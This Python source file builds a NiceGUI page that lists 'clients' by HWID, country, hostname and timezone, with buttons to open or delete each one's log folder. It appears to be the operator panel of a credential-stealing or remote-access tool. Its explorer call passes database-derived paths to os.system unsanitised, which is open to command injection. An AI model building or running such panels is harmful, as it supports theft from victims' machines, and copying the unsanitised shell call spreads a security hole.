import os
import shutil
import logging
import aiosqlite

from nicegui import ui

columns = [
    {"name": "id", "label": "ID", "field": "id", "required": True, "sortable": True},
    {"name": "hwid", "label": "HWID", "field": "hwid", "required": True, "sortable": True},
    {"name": "country_code", "label": "Country Code", "field": "country_code", "required": True, "sortable": True},
    {"name": "hostname", "label": "Hostname", "field": "hostname", "required": True, "sortable": True},
    {"name": "date", "label": "Date", "field": "date", "required": True, "sortable": True},
    {"name": "timezone", "label": "Timezone", "field": "timezone", "required": True, "sortable": True},
]

async def clients_page_stuff(db_path: str) -> None:
    """Clients page to view connected clients."""
    data = []
    seen_entries = set()

    async with aiosqlite.connect(db_path) as db:
        cursor = await db.execute("SELECT * FROM entries")
        rows = await cursor.fetchall()
        await cursor.close()

        for row in rows:
            new_data = {
                "id": row[0], "hwid": row[1], "country_code": row[2],
                "hostname": row[3], "date": row[4], "timezone": row[5],
            }
            new_data_tuple = tuple(new_data.items())
            if new_data_tuple not in seen_entries:
                seen_entries.add(new_data_tuple)
                data.append(new_data)

    with ui.card().classes("w-full h-full flex flex-col items-center no-shadow border border-gray-200 rounded-lg"):
        ui.label("Clients List").classes("text-2xl font-semibold my-2")

        with ui.table(columns=columns, rows=data).classes("w-[95%] h-[70vh] bordered") as table:
            table.pagination(10)
            table.selection("single")

            with table.add_slot("top-right"):
                with ui.input(placeholder="Search").props("type=search").bind_value(table, "filter").add_slot("append"):
                    ui.icon("search")

            with table.add_slot("bottom-row"):
                with table.row():
                    with table.cell():
                        ui.button("Open", on_click=lambda: open_in_explorer(get_log_path(table.selected[0], db_path))
                        ).bind_visibility_from(table, "selected", backward=lambda val: bool(val)
                        ).props("flat fab-mini")

                        ui.button("Remove", on_click=lambda: remove_entry(table.selected[0]["hwid"], db_path)
                        ).bind_visibility_from(table, "selected", backward=lambda val: bool(val)
                        ).props("flat fab-mini")

def get_log_path(entry: dict, db_path: str) -> str:
    """Constructs the log path for the selected entry."""
    return os.path.join(
        os.path.dirname(db_path), "logs", str(entry["hwid"]),
        f"{entry['country_code']}-({entry['hostname']})-({entry['date']})-({entry['timezone']})"
    )

def open_in_explorer(path: str) -> None:
    """Open the folder in the explorer."""
    os.system(f'explorer "{path}"')

async def remove_entry(hwid: str, db_path: str) -> None:
    """Remove a row from the database with the given HWID."""
    async with aiosqlite.connect(db_path) as db:
        cursor = await db.execute("SELECT filepath FROM entries WHERE hwid = ?", (hwid,))
        logs_path = await cursor.fetchone()
        await db.execute("DELETE FROM entries WHERE hwid = ?", (hwid,))
        await db.commit()
    logging.info(f"Removed entry with HWID: {hwid}")

    if logs_path:
        logs_folder = os.path.dirname(logs_path[0])
        shutil.rmtree(logs_folder, ignore_errors=True)
